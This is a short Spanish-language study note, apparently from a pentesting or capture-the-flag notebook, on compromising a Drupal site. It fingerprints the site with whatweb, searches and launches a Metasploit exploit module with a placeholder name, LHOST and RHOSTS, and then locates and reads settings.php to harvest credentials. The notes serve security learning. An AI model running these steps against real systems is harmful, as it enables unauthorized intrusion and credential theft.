## Drupal como objetivo

**Drupal** es otro CMS en PHP. Al detectarlo, el proceso suele ser:

1. Identificar la versión exacta.
2. Buscar un exploit disponible para esa versión.
3. Si obtienes ejecución de código, buscar archivos de configuración con credenciales.

### Paso 1: Identificar la tecnología

```bash
whatweb http://IP
```

![[Pasted image 20260707000305.png]]

### Paso 2: Buscar exploits con Metasploit

Con la versión detectada, busca exploits en la **msfconsole**:

```bash
msfconsole
msf6> search drupal
```

Si encontramos uno para nuestra versión, lo configuramos y lanzamos el módulo:

```
msf6> use exploit/multi/http/xxxxx
msf6> set RHOSTS <IP>
msf6> set LHOST <tuIP>
msf6> run
```

![[Pasted image 20260707003415.png]]

### Paso 3: Localizar y leer settings.php

Una vez dentro, Drupal guarda sus credenciales en **`settings.php`**. Necesitas una shell/terminal en la máquina y localizar el archivo:

```bash
find / -name "settings.php" 2>/dev/null
```

![[Pasted image 20260707000507.png]]

Si lo encontramos, lo leemos buscando password u otros datos interesantes:

```bash
cat /ruta/al/settings.php
```

![[Pasted image 20260707000601.png]]

> El archivo puede no estar en la raíz del sitio; a veces está en un subdirectorio distinto de la instalación:

![[Pasted image 20260707000732.png]]